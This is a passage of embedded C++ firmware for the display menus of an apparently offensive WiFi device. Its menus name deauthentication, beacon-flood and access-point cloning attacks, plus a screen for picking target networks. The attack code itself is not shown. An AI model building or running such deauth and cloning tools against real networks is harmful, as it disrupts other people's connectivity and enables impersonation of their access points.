      while ((long)(millis() - nextStepDeadline) < 0) {
        // 
      }
      nextStepDeadline += delayPerStepMs;
    }
  }
}

// ===== Generic animation + shims to reduce duplication =====
static int g_deauthBaseStartIndex = 0;
static int g_ssidBaseStartIndex = 0;

void drawDeauthMenuBaseShim() { drawDeauthMenuBase_NoFlush(g_deauthBaseStartIndex); }
void drawSsidPageBaseShim() { drawSsidPageBase_NoFlush(g_ssidBaseStartIndex); }

static inline void animateSelectionGeneric(
  int yFrom,
  int yTo,
  int rectHeight,
  int cornerRadius,
  bool useFullWidth,
  bool doubleOutline,
  void (*drawBaseNoFlush)()
) {
  const int delayPerStepMs = SELECT_MOVE_TOTAL_MS / ANIM_STEPS;
  const int width = useFullWidth ? display.width() : (display.width() - UI_RIGHT_GUTTER);
  unsigned long startMs = millis();
  unsigned long nextStepDeadline = startMs + delayPerStepMs;
  for (int s = 1; s <= ANIM_STEPS; s++) {
    int y = yFrom + ((yTo - yFrom) * s) / ANIM_STEPS;
    drawBaseNoFlush();
    display.drawRoundRect(0, y, width, rectHeight, cornerRadius, SSD1306_WHITE);
    if (doubleOutline) {
      display.drawRoundRect(1, y + 1, width - 2, rectHeight - 2, cornerRadius, SSD1306_WHITE);
    }
    if ((s % DISPLAY_FLUSH_EVERY_FRAMES) == 0 || s == ANIM_STEPS) {
      display.display();
    }
    // 
    if (delayPerStepMs > 0) {
      while ((long)(millis() - nextStepDeadline) < 0) {
        // /（）
        // yield();
      }
      nextStepDeadline += delayPerStepMs;
    }
  }
}

// ：（）
void drawAttackMenuBase() {
  display.clearDisplay();
  display.setTextSize(1);
  const char* menuItems[] = {
    "Deauth Attack",
    "Beacon Attack",
    "Beacon + Deauth",
    "《 Back 》"
  };
  for (int i = 0; i < 4; i++) {
    int yPos = 2 + i * 16;
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    u8g2_for_adafruit_gfx.setCursor(5, yPos+10);
    u8g2_for_adafruit_gfx.print(menuItems[i]);
    drawRightChevron(yPos-2, 14, false);
  }
}

// ：
void drawAttackMenuBase_NoFlush() {
  display.clearDisplay();
  display.setTextSize(1);
  const char* menuItems[] = {
    "Deauth Attack",
    "Beacon Attack",
    "Beacon + Deauth",
    "《 Back 》"
  };
  for (int i = 0; i < 4; i++) {
    int yPos = 2 + i * 16;
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    u8g2_for_adafruit_gfx.setCursor(5, yPos+10);
    u8g2_for_adafruit_gfx.print(menuItems[i]);
    drawRightChevron(yPos-2, 14, false);
  }
}
// ：（）
void drawBeaconMenuBase() {
  display.clearDisplay();
  display.setTextSize(1);
  const char* menuItems[] = {"Random Beacon", "Clone AP (Force)", "Clone AP (Stable)", "《 Back 》"};
  for (int i = 0; i < 4; i++) {
    int yPos = 2 + i * 16;
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    u8g2_for_adafruit_gfx.setCursor(5, yPos+10);
    u8g2_for_adafruit_gfx.print(menuItems[i]);
    drawRightChevron(yPos-2, 14, false);
  }
  display.display();
}

// ：
void drawBeaconMenuBase_NoFlush() {
  display.clearDisplay();
  display.setTextSize(1);
  const char* menuItems[] = {"Random Beacon", "Clone AP (Force)", "Clone AP (Stable)", "《 Back 》"};
  for (int i = 0; i < 4; i++) {
    int yPos = 2 + i * 16;
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    u8g2_for_adafruit_gfx.setCursor(5, yPos+10);
    u8g2_for_adafruit_gfx.print(menuItems[i]);
    drawRightChevron(yPos-2, 14, false);
  }
}
// ：（）
void drawDeauthMenuBase(int startIndex) {
  display.clearDisplay();
  display.setTextSize(1);
  const char* menuItems[] = {
    "Stable Auto Multi",
    "Auto Multi",
    "Auto Single",
    "All Channel",
    "Single Target",
    "Multi Target",
    "《 Back 》"
  };
  for (int i = 0; i < 4; i++) {
    int menuIndex = startIndex + i;
    if (menuIndex >= 6) break;
    int yPos = 2 + i * 16;
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    u8g2_for_adafruit_gfx.setCursor(5, yPos+10);
    u8g2_for_adafruit_gfx.print(menuItems[menuIndex]);
    drawRightChevron(yPos-2, 14, false);
  }
  display.display();
}
// ：
void drawDeauthMenuBase_NoFlush(int startIndex) {
  display.clearDisplay();
  display.setTextSize(1);
  const char* menuItems[] = {
    "Stable Auto Multi",
    "Auto Multi",
    "Auto Single",
    "All Channel",
    "Single Target",
    "Multi Target",
    "《 Back 》"
  };
  for (int i = 0; i < 4; i++) {
    int menuIndex = startIndex + i;
    if (menuIndex >= 6) break;
    int yPos = 2 + i * 16;
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    u8g2_for_adafruit_gfx.setCursor(5, yPos+10);
    u8g2_for_adafruit_gfx.print(menuItems[menuIndex]);
    drawRightChevron(yPos-2, 14, false);
  }
}

// SSID"[?]"，ASCII（CJK）
String sanitizeForDisplay(const String& input) {
  String output;
  for (size_t i = 0; i < (size_t)input.length(); ) {
    unsigned char b0 = (unsigned char)input[i];
    // ASCII
    if (b0 < 0x80) {
      if (b0 >= 32 && b0 != 127) {
        output += (char)b0;
      } else {
        output += "[?]";
      }
      i += 1;
      continue;
    }
    // UTF-8
    int seqLen = 0;
    if ((b0 & 0xE0) == 0xC0) seqLen = 2;         // 110xxxxx
    else if ((b0 & 0xF0) == 0xE0) seqLen = 3;    // 1110xxxx
    else if ((b0 & 0xF8) == 0xF0) seqLen = 4;    // 11110xxx
    else { output += "[?]"; i += 1; continue; }

    // 
    if (i + (size_t)seqLen > (size_t)input.length()) { output += "[?]"; break; }
    // 
    bool valid = true;
    for (int k = 1; k < seqLen; ++k) {
      unsigned char bk = (unsigned char)input[i + k];
      if ((bk & 0xC0) != 0x80) { valid = false; break; }
    }
    if (!valid) { output += "[?]"; i += 1; continue; }

    if (seqLen == 3) {
      // 
      unsigned char b1 = (unsigned char)input[i + 1];
      unsigned char b2 = (unsigned char)input[i + 2];
      uint16_t codepoint = ((b0 & 0x0F) << 12) | ((b1 & 0x3F) << 6) | (b2 & 0x3F);
      // ：
      // - CJK U+4E00..U+9FFF（）
      // - CJK U+3000..U+303F（：、。「」《》…）
      // - U+FF00..U+FFEF（、）
      // - U+2000..U+206F（— – “ ” ‘ ’ … ）
      if ((codepoint >= 0x4E00 && codepoint <= 0x9FFF) ||
          (codepoint >= 0x3000 && codepoint <= 0x303F) ||
          (codepoint >= 0xFF00 && codepoint <= 0xFFEF) ||
          (codepoint >= 0x2000 && codepoint <= 0x206F)) {
        output += input.substring(i, i + 3);
      } else {
        output += "[?]";
      }
      i += 3;
    } else if (seqLen == 2) {
      // 2，
      output += "[?]";
      i += 2;
    } else { // seqLen == 4 (emoji)
      output += "[?]";
      i += 4;
    }
  }
  return output;
}

// ：SSID（）
void drawSsidPageBase(int startIndex) {
  const int MAX_DISPLAY_ITEMS = 4;
  const int ITEM_HEIGHT = 14;
  const int Y_OFFSET = 2;
  const int TEXT_LEFT = 6;
  const int BASELINE_ASCII_OFFSET = 4;
  const int BASELINE_CHINESE_OFFSET = 10;
  const int SSID_RIGHT_LIMIT_X = 110;
  const int STAR_GAP = 20;

  bool allSelected = (SelectedVector.size() == scan_results.size() && !scan_results.empty());
  display.clearDisplay();
  display.setTextSize(1);
  for (int i = 0; i < MAX_DISPLAY_ITEMS && i <= (int)scan_results.size(); i++) {
    int displayIndex = startIndex + i;
    if (displayIndex > (int)scan_results.size()) break;
    if (displayIndex == 0) {
      int yPos = i * ITEM_HEIGHT + Y_OFFSET;
      u8g2_for_adafruit_gfx.setFontMode(1);
      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
      const char* label = allSelected ? "> Deselect All <" : "> Select All <";
      int w = u8g2_for_adafruit_gfx.getUTF8Width(label);
      int x = (display.width() - w) / 2;
      u8g2_for_adafruit_gfx.setCursor(x, yPos + BASELINE_CHINESE_OFFSET);
      u8g2_for_adafruit_gfx.print(label);
      continue;
    }
    int wifiIndex = displayIndex - 1;
    String ssid = sanitizeForDisplay(scan_results[wifiIndex].ssid);
    if (ssid.length() == 0) {
      char mac[18];
      snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
        scan_results[wifiIndex].bssid[0],
        scan_results[wifiIndex].bssid[1],
        scan_results[wifiIndex].bssid[2],
        scan_results[wifiIndex].bssid[3],
        scan_results[wifiIndex].bssid[4],
        scan_results[wifiIndex].bssid[5]);
      ssid = String(mac);
    }
    bool isSelected = isIndexSelected(wifiIndex);
    bool showIndicator = isSelected;
    if (showIndicator) {
      display.setCursor(3, i * ITEM_HEIGHT + BASELINE_ASCII_OFFSET + Y_OFFSET);
      display.setTextColor(SSD1306_WHITE);
      display.print("[*]");
    }
    int textX = TEXT_LEFT + (isSelected ? STAR_GAP : 0);
    String clipped = utf8TruncateToWidth(ssid, SSID_RIGHT_LIMIT_X - textX);
    if (containsChinese(ssid)) {
      u8g2_for_adafruit_gfx.setFontMode(1);
      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
      int textY = i * ITEM_HEIGHT + BASELINE_CHINESE_OFFSET + Y_OFFSET;
      u8g2_for_adafruit_gfx.setCursor(textX, textY);
      u8g2_for_adafruit_gfx.print(clipped);
    } else {
      display.setCursor(textX, i * ITEM_HEIGHT + BASELINE_ASCII_OFFSET + Y_OFFSET);
      display.setTextColor(SSD1306_WHITE);
      display.print(clipped);
    }
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(110, i * ITEM_HEIGHT + BASELINE_ASCII_OFFSET + Y_OFFSET);
    display.print(scan_results[wifiIndex].channel >= 36 ? "5G" : "24");
  }
  display.display();
}
// ：
void drawSsidPageBase_NoFlush(int startIndex) {
  const int MAX_DISPLAY_ITEMS = 4;
  const int ITEM_HEIGHT = 14;
  const int Y_OFFSET = 2;
  const int TEXT_LEFT = 6;
  const int BASELINE_ASCII_OFFSET = 4;
  const int BASELINE_CHINESE_OFFSET = 10;
  const int SSID_RIGHT_LIMIT_X = 110;
  const int STAR_GAP = 20;

  bool allSelected = (SelectedVector.size() == scan_results.size() && !scan_results.empty());
  display.clearDisplay();
  display.setTextSize(1);
  for (int i = 0; i < MAX_DISPLAY_ITEMS && i <= (int)scan_results.size(); i++) {
    int displayIndex = startIndex + i;
    if (displayIndex > (int)scan_results.size()) break;
    if (displayIndex == 0) {
      int yPos = i * ITEM_HEIGHT + Y_OFFSET;
      u8g2_for_adafruit_gfx.setFontMode(1);
      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
      const char* label = allSelected ? "> Deselect All <" : "> Select All <";
      int w = u8g2_for_adafruit_gfx.getUTF8Width(label);
      int x = (display.width() - w) / 2;
      u8g2_for_adafruit_gfx.setCursor(x, yPos + BASELINE_CHINESE_OFFSET);
      u8g2_for_adafruit_gfx.print(label);
      continue;
    }
    int wifiIndex = displayIndex - 1;
    String ssid = sanitizeForDisplay(scan_results[wifiIndex].ssid);
    if (ssid.length() == 0) {
      char mac[18];
      snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
        scan_results[wifiIndex].bssid[0],
        scan_results[wifiIndex].bssid[1],
        scan_results[wifiIndex].bssid[2],
        scan_results[wifiIndex].bssid[3],
        scan_results[wifiIndex].bssid[4],
        scan_results[wifiIndex].bssid[5]);
      ssid = String(mac);
    }
    bool isSelected = isIndexSelected(wifiIndex);
    bool showIndicator = isSelected;
    if (showIndicator) {
      display.setCursor(3, i * ITEM_HEIGHT + BASELINE_ASCII_OFFSET + Y_OFFSET);
      display.setTextColor(SSD1306_WHITE);
      display.print("[*]");
    }
    int textX = TEXT_LEFT + (isSelected ? STAR_GAP : 0);
    String clipped = utf8TruncateToWidth(ssid, SSID_RIGHT_LIMIT_X - textX);
    if (containsChinese(ssid)) {
      u8g2_for_adafruit_gfx.setFontMode(1);
      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
      int textY = i * ITEM_HEIGHT + BASELINE_CHINESE_OFFSET + Y_OFFSET;
      u8g2_for_adafruit_gfx.setCursor(textX, textY);
      u8g2_for_adafruit_gfx.print(clipped);
    } else {
      display.setCursor(textX, i * ITEM_HEIGHT + BASELINE_ASCII_OFFSET + Y_OFFSET);
      display.setTextColor(SSD1306_WHITE);
      display.print(clipped);
    }
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(110, i * ITEM_HEIGHT + BASELINE_ASCII_OFFSET + Y_OFFSET);
    display.print(scan_results[wifiIndex].channel >= 36 ? "5G" : "24");
  }
}

// （）：，
void animateMove(int yFrom, int yTo, int rectHeight, void (*drawBase)()) {
  animateSelectionGeneric(yFrom, yTo, rectHeight, 4, /*useFullWidth=*/false, /*doubleOutline=*/false, drawBase);
}

// （/）：，
void animateMoveFullWidth(int yFrom, int yTo, int rectHeight, void (*drawBase)(), int cornerRadius) {
  animateSelectionGeneric(yFrom, yTo, rectHeight, cornerRadius, /*useFullWidth=*/true, /*doubleOutline=*/false, drawBase);
}

// ：（）
void animateMoveDeauth(int yFrom, int yTo, int rectHeight, int startIndex) {
  g_deauthBaseStartIndex = startIndex;
  animateSelectionGeneric(yFrom, yTo, rectHeight, 2, /*useFullWidth=*/true, /*doubleOutline=*/false, drawDeauthMenuBaseShim);
}

// ：SSID（）
void animateMoveSsid(int yFrom, int yTo, int rectHeight, int startIndex) {
  g_ssidBaseStartIndex = startIndex;
  animateSelectionGeneric(yFrom, yTo, rectHeight, 2, /*useFullWidth=*/true, /*doubleOutline=*/true, drawSsidPageBaseShim);
}

// ：（）- 
void animateMoveHome(int yFrom, int yTo, int rectHeight, int startIndex) {
  g_homeBaseStartIndex = startIndex;
  animateSelectionGeneric(yFrom, yTo, rectHeight, 7, /*useFullWidth=*/false, /*doubleOutline=*/false, drawHomeMenuBasePagedShim);
}

void drawHomeMenu() {
  static int prevState = -1;
  // const int MAX_DISPLAY_ITEMS = 3; // ３ - 

  int startIndex = homeStartIndex;
  g_homeBaseStartIndex = startIndex;

  if (prevState == -1) prevState = homeState;

  // ，loop
  if (!g_skipNextSelectAnim && prevState != homeState) {
    int yFrom = HOME_Y_OFFSET + prevState * HOME_ITEM_HEIGHT;
    int yTo = HOME_Y_OFFSET + homeState * HOME_ITEM_HEIGHT;
    // 
    animateMove(yFrom, yTo, HOME_RECT_HEIGHT, drawHomeMenuBasePagedShim);
    prevState = homeState;
  } else if (g_skipNextSelectAnim) {
    // 
    prevState = homeState;
    g_skipNextSelectAnim = false;
  }

  display.clearDisplay();
  display.setTextSize(1);
  // 
  int currentPageItems = (HOME_PAGE_SIZE < (HOME_MAX_ITEMS - startIndex)) ? HOME_PAGE_SIZE : (HOME_MAX_ITEMS - startIndex);
  for (int i = 0; i < currentPageItems; i++) {
    int menuIndex = startIndex + i;
    if (menuIndex >= HOME_MAX_ITEMS) break;
    int rectY = HOME_Y_OFFSET + i * HOME_ITEM_HEIGHT;
    int textY = rectY + 13; // 2px
    bool isSel = (i == homeState);
    
    // ，
    String label = g_homeMenuItems[menuIndex].label;
    int maxTextWidth = display.width() - UI_RIGHT_GUTTER - 15; // 
    int labelWidth = u8g2_for_adafruit_gfx.getUTF8Width(label.c_str());
    
    if (labelWidth > maxTextWidth) {
      // UTF-8
      while (label.length() > 0 && 
             u8g2_for_adafruit_gfx.getUTF8Width(label.c_str()) > maxTextWidth - 20) {
        // （UTF-8）
        label.remove(label.length() - 1);
        // UTF-8
        while (label.length() > 0 && ((uint8_t)label[label.length()-1] & 0xC0) == 0x80) {
          label.remove(label.length() - 1);
        }
      }
      label += "..";
    }
    
    if (isSel) {
      // （）
      display.fillRoundRect(0, rectY, display.width() - UI_RIGHT_GUTTER, HOME_RECT_HEIGHT, 4, SSD1306_WHITE);
      u8g2_for_adafruit_gfx.setFontMode(1);
      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_BLACK);
      u8g2_for_adafruit_gfx.setCursor(5, textY + 1);
      u8g2_for_adafruit_gfx.print(label);
    } else {
      u8g2_for_adafruit_gfx.setFontMode(1);
      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
      u8g2_for_adafruit_gfx.setCursor(5, textY + 1);
      u8g2_for_adafruit_gfx.print(label);
    }
    // 
    drawRightChevron(rectY, HOME_RECT_HEIGHT, isSel);
  }
  // 
  drawHomeScrollbar(startIndex);
  display.display();
}

// ：，
inline void setHomeSelection(int startIndex, int state) {
  homeStartIndex = startIndex;
  homeState = state;
  menustate = homeStartIndex + homeState;
  g_homeBaseStartIndex = homeStartIndex;
}

// ：""，
inline void homeMoveUp(unsigned long currentTime) {
  if (currentTime - lastDownTime <= DEBOUNCE_DELAY) return;
  if (homeState > 0) {
    setHomeSelection(homeStartIndex, homeState - 1);
  } else if (homeStartIndex > 0) {
    // 
    int prevStart = homeStartIndex;
    setHomeSelection(homeStartIndex - 1, 0);
    animateHomePageFlip(prevStart, homeStartIndex);
    g_skipNextSelectAnim = true;
  }
  lastDownTime = currentTime;
}

// ：""，
inline void homeMoveDown(unsigned long currentTime) {
  if (currentTime - lastUpTime <= DEBOUNCE_DELAY) return;
  // 
  int currentPageItems = (HOME_PAGE_SIZE < (HOME_MAX_ITEMS - homeStartIndex)) ? HOME_PAGE_SIZE : (HOME_MAX_ITEMS - homeStartIndex);
  if (homeState < currentPageItems - 1) {
    setHomeSelection(homeStartIndex, homeState + 1);
  } else if (homeStartIndex + homeState + 1 < HOME_MAX_ITEMS) {
    // （）
    int prevStart = homeStartIndex;
    int nextStartIndex = homeStartIndex + 1;
    // 
    int nextPageItems = (HOME_PAGE_SIZE < (HOME_MAX_ITEMS - nextStartIndex)) ? HOME_PAGE_SIZE : (HOME_MAX_ITEMS - nextStartIndex);
    // homeState（）
    int nextHomeState = (nextPageItems > 0) ? (nextPageItems - 1) : 0;
    setHomeSelection(nextStartIndex, nextHomeState);
    animateHomePageFlip(prevStart, nextStartIndex);
    g_skipNextSelectAnim = true;
  }
  // ，（）
  lastUpTime = currentTime;
}

// ："/OK"
inline void handleHomeOk() {
  if (digitalRead(BTN_OK) != LOW) return;
  delay(400);
  // 
  if (menustate >= 0 && menustate < HOME_MAX_ITEMS) {
    if (g_homeMenuItems[menustate].action != nullptr) {
      g_homeMenuItems[menustate].action();
    }
  }
}

void showWiFiDetails(const WiFiScanResult& wifi) {
    bool exitDetails = false;
    int scrollPosition = 0;
    unsigned long lastScrollTime = 0;
    const unsigned long SCROLL_DELAY = 300;
    int detailsScroll = 0;  // 0，
    const int LINE_HEIGHT = 12; // ，
    
    // ，
    unsigned long lastUpTime = 0;
    unsigned long lastDownTime = 0;
    unsigned long lastBackTime = 0;
    unsigned long lastOkTime = 0;
    
    while (!exitDetails) {
        unsigned long currentTime = millis();
        
        if (digitalRead(BTN_BACK) == LOW) {
            if (currentTime - lastBackTime <= DEBOUNCE_DELAY) continue;
            exitDetails = true;
            continue;
        }
        
        if (digitalRead(BTN_UP) == LOW) {
            if (currentTime - lastUpTime <= DEBOUNCE_DELAY) continue;
            if (detailsScroll > 0) detailsScroll--;
            scrollPosition = 0; // 
            lastUpTime = currentTime;
        }
        
        if (digitalRead(BTN_DOWN) == LOW) {
            if (currentTime - lastDownTime <= DEBOUNCE_DELAY) continue;
            if (detailsScroll < 1) detailsScroll++; // 1，5，4
            scrollPosition = 0; // 
            lastDownTime = currentTime;
        }

        if (digitalRead(BTN_OK) == LOW) {
            if (currentTime - lastOkTime <= DEBOUNCE_DELAY) continue;
            if (detailsScroll == 1) {
                exitDetails = true;
                continue;
            }
            lastOkTime = currentTime;
        }

        display.clearDisplay();
        display.setTextSize(1);
        
        struct DetailLine {
            String label;
            String value;
            bool isChinese;
        };
        
        DetailLine details[] = {
            {"SSID:", wifi.ssid.length() > 0 ? sanitizeForDisplay(wifi.ssid) : "<Hidden>", containsChinese(wifi.ssid)},
            {"RSSI:", String(wifi.rssi) + " dBm", true}, 
            {"CH:", String(wifi.channel) + (wifi.channel >= 36 ? " (5G)" : " (2.4G)"), true},
            {"MAC:", wifi.bssid_str, false},
            {"《 Back 》", "", true}
        };

        // 
        for (int i = 0; i < 4 && (i + detailsScroll) < 5; i++) {
            int currentLine = i + detailsScroll;
            int yPos = 5 + (i * LINE_HEIGHT); // 
            
            if (currentLine == 4) { // 
                if (detailsScroll == 1) {
                    display.fillRoundRect(0, yPos-1, display.width(), LINE_HEIGHT, 3, WHITE);
                    u8g2_for_adafruit_gfx.setFontMode(1);
                    u8g2_for_adafruit_gfx.setForegroundColor(BLACK);
                    u8g2_for_adafruit_gfx.setCursor(0, yPos+8);
                    u8g2_for_adafruit_gfx.print("《 Back 》");
                    u8g2_for_adafruit_gfx.setForegroundColor(WHITE);
                } else {
                    u8g2_for_adafruit_gfx.setFontMode(1);
                    u8g2_for_adafruit_gfx.setForegroundColor(WHITE);
                    u8g2_for_adafruit_gfx.setCursor(0, yPos+8);
                    u8g2_for_adafruit_gfx.print("《 Back 》");
                }
                continue;
            }

            // 
            if (details[currentLine].isChinese) {
                u8g2_for_adafruit_gfx.setFontMode(1);
                u8g2_for_adafruit_gfx.setForegroundColor(WHITE);
                u8g2_for_adafruit_gfx.setCursor(0, yPos+8);
                u8g2_for_adafruit_gfx.print(details[currentLine].label);
                
                // ，
                const int VALUE_X = 40; // ，
                
                // 
                String value = details[currentLine].value;
                bool needScroll = false;
                
                // 
                if (containsChinese(value) && value.length() > 15) { // 15
                    needScroll = true;
                } else if (!containsChinese(value) && value.length() > 20) { // 20
                    needScroll = true;
                }
                
                if (needScroll) {
                    // 
                    if (currentTime - lastScrollTime >= SCROLL_DELAY) {
                        scrollPosition++;
                        if ((size_t)scrollPosition >= value.length()) {
                            scrollPosition = 0;
                        }
                        lastScrollTime = currentTime;
                    }
                    
                    // 
                    String scrolledText = value.substring(scrollPosition) + " " + value.substring(0, scrollPosition);
                    value = scrolledText.substring(0, containsChinese(value) ? 15 : 20);
                }
                
                u8g2_for_adafruit_gfx.setCursor(VALUE_X, yPos+8);
                u8g2_for_adafruit_gfx.print(value);
            } else {
                // 
                u8g2_for_adafruit_gfx.setFontMode(1);
                u8g2_for_adafruit_gfx.setForegroundColor(WHITE);
                u8g2_for_adafruit_gfx.setCursor(0, yPos+8);
                u8g2_for_adafruit_gfx.print(details[currentLine].label);
                
                // 
                const int VALUE_X = 26;
                if (details[currentLine].value.length() > 0) {
                    String value = details[currentLine].value;
                    bool needScroll = false;
                    
                    // MAC，
                    if (value.length() > 20) {
                        needScroll = true;
                    }
                    
                    if (needScroll) {
                        // 
                        if (currentTime - lastScrollTime >= SCROLL_DELAY) {
                            scrollPosition++;
                            if ((size_t)scrollPosition >= value.length()) {
                                scrollPosition = 0;
                            }
                            lastScrollTime = currentTime;
                        }
                        
                        // 
                        String scrolledText = value.substring(scrollPosition) + " " + value.substring(0, scrollPosition);
                        value = scrolledText.substring(0, 20);
                    }
                    
                    if (containsChinese(value)) {
                        u8g2_for_adafruit_gfx.setCursor(VALUE_X, yPos+8);
                        u8g2_for_adafruit_gfx.print(value);
                    } else {
                        display.setCursor(VALUE_X, yPos);
                        display.print(value);
                    }
                }
            }
        }
        
        // 
        if (detailsScroll > 0) {
            display.fillTriangle(120, 12, 123, 9, 126, 12, WHITE);
        }
        if (detailsScroll < 1) { // 1
            display.fillTriangle(120, 60, 123, 63, 126, 60, WHITE);
        }
        
        display.display();
        delay(10);
    }
}
void drawssid() {
  const int MAX_DISPLAY_ITEMS = 4; // 4
  const int ITEM_HEIGHT = 14; // 
  const int Y_OFFSET = 2; // Y
  const int TEXT_LEFT = 6; // 
  const int BASELINE_ASCII_OFFSET = 4; // /
  const int BASELINE_CHINESE_OFFSET = 10; // 
  const int SSID_RIGHT_LIMIT_X = 110; // SSID （ 24/5G ）
  const int STAR_GAP = 20; // "[*]"
  const int ARROW_GAP = 8; // ">"
  int startIndex = 0;
  scrollindex = 0;
  bool allSelected = (SelectedVector.size() == scan_results.size() && !scan_results.empty());
  
  // ，
  
  unsigned long lastScrollTime = 0;
  const unsigned long SCROLL_DELAY = 300;
  int scrollPosition = 0;
  String currentScrollText = "";
  
  // ，
  unsigned long lastUpTime = 0;
  unsigned long lastDownTime = 0;
  
  while(true) {
    unsigned long currentTime = millis();
    // ""
    allSelected = (SelectedVector.size() == scan_results.size() && !scan_results.empty());
    
    if(digitalRead(BTN_BACK)==LOW) break;
    
    if(digitalRead(BTN_OK) == LOW) {
      delay(400);
      if(scrollindex == 0) {
        // /
        if (!allSelected) {
          SelectedVector.clear();
          SelectedVector.reserve(scan_results.size());
          for (size_t i = 0; i < scan_results.size(); i++) {
            SelectedVector.push_back((int)i);
          }
          selectedFlags.assign(scan_results.size(), 1);
          allSelected = true;
        } else {
          SelectedVector.clear();
          selectedFlags.assign(scan_results.size(), 0);
          allSelected = false;
        }
      } else {
        // （）
        toggleSelection(scrollindex - 1);
      }
      unsigned long pressStartTime = millis();
      while (digitalRead(BTN_OK) == LOW) {
        if (millis() - pressStartTime >= 800) {
          if (scrollindex >= 1) {
            showWiFiDetails(scan_results[scrollindex - 1]);
          }
          while (digitalRead(BTN_OK) == LOW) delay(10);
          break;
        }
      }
      lastDownTime = currentTime;
    }
    
    if(digitalRead(BTN_DOWN) == LOW) {
      if (currentTime - lastDownTime <= DEBOUNCE_DELAY) continue;
      scrollPosition = 0;
      // ：SSID（ scan_results.size()）
      if(scrollindex < (int)scan_results.size()) {
        int prev = scrollindex;
        scrollindex++;
        if(scrollindex - startIndex >= MAX_DISPLAY_ITEMS) {
          startIndex++;
          // （）：（3， MAX_DISPLAY_ITEMS-2）
          int yFrom = (MAX_DISPLAY_ITEMS-2) * ITEM_HEIGHT + Y_OFFSET - 1;
          int yTo = (MAX_DISPLAY_ITEMS-1) * ITEM_HEIGHT + Y_OFFSET - 1;
          animateMoveSsid(yFrom, yTo, ITEM_HEIGHT + 2, startIndex);
        } else {
          // ，
          int yFrom = (prev - startIndex) * ITEM_HEIGHT + Y_OFFSET - 1; // 
          int yTo = (scrollindex - startIndex) * ITEM_HEIGHT + Y_OFFSET - 1;
          animateMoveSsid(yFrom, yTo, ITEM_HEIGHT + 2, startIndex);
        }
      }
      lastUpTime = currentTime;
    }
    
    if(digitalRead(BTN_UP) == LOW) {
      if (currentTime - lastUpTime <= DEBOUNCE_DELAY) continue;
      scrollPosition = 0;
      if(scrollindex > 0) {
        int prev = scrollindex;
        scrollindex--;
        if(scrollindex < startIndex && startIndex > 0) {
          startIndex--;
          // （）：
          int yFrom = 1 * ITEM_HEIGHT + Y_OFFSET - 1;   // 
          int yTo = 0 * ITEM_HEIGHT + Y_OFFSET - 1;     // 
          animateMoveSsid(yFrom, yTo, ITEM_HEIGHT + 2, startIndex);
          // 
          scrollindex = startIndex;
        } else {
          int yFrom = (prev - startIndex) * ITEM_HEIGHT + Y_OFFSET - 1;
          int yTo = (scrollindex - startIndex) * ITEM_HEIGHT + Y_OFFSET - 1;
          animateMoveSsid(yFrom, yTo, ITEM_HEIGHT + 2, startIndex);
        }
      }
      lastUpTime = currentTime;
    }
    
    display.clearDisplay();
    display.setTextSize(1);
    
    for(int i = 0; i < MAX_DISPLAY_ITEMS && i <= (int)scan_results.size(); i++) {
      int displayIndex = startIndex + i;
      if(displayIndex > (int)scan_results.size()) break;
      
      bool isHighlighted = (displayIndex == scrollindex);
      
      // /（）
      if(displayIndex == 0) {
        int yPos = i * ITEM_HEIGHT + Y_OFFSET;
        if(isHighlighted) {
          display.drawRoundRect(0, yPos-2, display.width(), ITEM_HEIGHT + 2, 2, SSD1306_WHITE);
          display.drawRoundRect(1, yPos-1, display.width()-2, ITEM_HEIGHT, 2, SSD1306_WHITE); // 
          u8g2_for_adafruit_gfx.setFontMode(1);
          u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
          const char* label = allSelected ? "> Deselect All <" : "> Select All <";
          int w = u8g2_for_adafruit_gfx.getUTF8Width(label);
          int x = (display.width() - w) / 2;
          u8g2_for_adafruit_gfx.setCursor(x, yPos + BASELINE_CHINESE_OFFSET);
          u8g2_for_adafruit_gfx.print(label);
        } else {
          u8g2_for_adafruit_gfx.setFontMode(1);
          u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
          const char* label = allSelected ? "> Deselect All <" : "> Select All <";
          int w = u8g2_for_adafruit_gfx.getUTF8Width(label);
          int x = (display.width() - w) / 2;
          u8g2_for_adafruit_gfx.setCursor(x, yPos + BASELINE_CHINESE_OFFSET);
          u8g2_for_adafruit_gfx.print(label);
        }
        continue;
      }
      
      // WiFi
      int wifiIndex = displayIndex - 1;
      String ssid = sanitizeForDisplay(scan_results[wifiIndex].ssid);
      
      if(ssid.length() == 0) {
        char mac[18];
        snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
          scan_results[wifiIndex].bssid[0],
          scan_results[wifiIndex].bssid[1],
          scan_results[wifiIndex].bssid[2],
          scan_results[wifiIndex].bssid[3],
          scan_results[wifiIndex].bssid[4],
          scan_results[wifiIndex].bssid[5]);
        ssid = String(mac);
      }

      // - 
      bool needScroll = false;
      if(isHighlighted) {
        if(containsChinese(ssid) && ssid.length() > 26) { // >26
          needScroll = true;
        } else if(!containsChinese(ssid) && ssid.length() > 18) { // >18
          needScroll = true;
        }
        
        if(needScroll) {
          if(currentTime - lastScrollTime >= SCROLL_DELAY) {
            scrollPosition++;
